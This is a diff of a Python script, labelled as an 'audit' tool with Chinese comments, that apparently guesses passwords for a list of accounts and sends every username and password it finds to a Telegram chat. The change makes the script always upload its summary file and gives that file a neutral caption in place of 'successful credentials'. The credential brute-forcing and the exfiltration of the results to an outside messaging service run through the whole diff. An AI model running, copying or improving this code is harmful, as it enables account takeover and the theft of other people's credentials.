@@ -22,7 +22,7 @@ def send_telegram_file(file_path):
     try:
         with open(file_path, "rb") as f:
             files = {"document": f}
-            data = {"chat_id": TELEGRAM_CHAT_ID, "caption": "📁 *审计成功凭据汇总文件*"}
+            data = {"chat_id": TELEGRAM_CHAT_ID, "caption": "📁 *审计运行结果汇总文件*"}
             res = requests.post(url, data=data, files=files, timeout=10)
             if res.status_code == 200:
                 print("[+] Telegram TXT 文件发送成功")
@@ -121,24 +121,22 @@ def main():
             if not found:
                 print(f"[-] 账号 {username} 未找到正确密码")
 
-    # === 全部跑完后，统一生成汇总文件并仅通过 TXT 文件发送到电报 ===
+    # === 全部跑完后，统一生成汇总文件并无论如何都发送给电报 ===
+    summary_content = "=== 审计结果汇总 ===\n\n"
     if successful_results:
-        summary_content = "=== 审计成功凭据汇总 ===\n\n"
         for item in successful_results:
             summary_content += f"账号: {item['username']} | 密码: {item['password']} | 时间: {item['time']}\n"
-        
-        # 写入汇总 TXT
-        with open(SUMMARY_TXT_PATH, "w", encoding="utf-8") as f:
-            f.write(summary_content)
-            
-        # 仅发送 TXT 文件
-        send_telegram_file(SUMMARY_TXT_PATH)
     else:
-        # 如果没有找到，也生成一个空提示文件防止打包报错
-        with open(SUMMARY_TXT_PATH, "w", encoding="utf-8") as f:
-            f.write(f"审计完成时间: {current_time_str} - 本次未发现有效凭据。\n")
+        summary_content += f"审计完成时间: {current_time_str}\n状态: 本次未发现有效凭据。\n"
+    
+    # 写入汇总 TXT
+    with open(SUMMARY_TXT_PATH, "w", encoding="utf-8") as f:
+        f.write(summary_content)
+        
+    # 无论有无结果，都把这个 TXT 文件发送到电报
+    send_telegram_file(SUMMARY_TXT_PATH)
 
-    print(f"\n[*] 全自动审计结束，共找到 {len(successful_results)} 个有效凭据并已打包。")
+    print(f"\n[*] 全自动审计结束，共找到 {len(successful_results)} 个有效凭据并已打包发送。")
 
 if __name__ == "__main__":
     main()
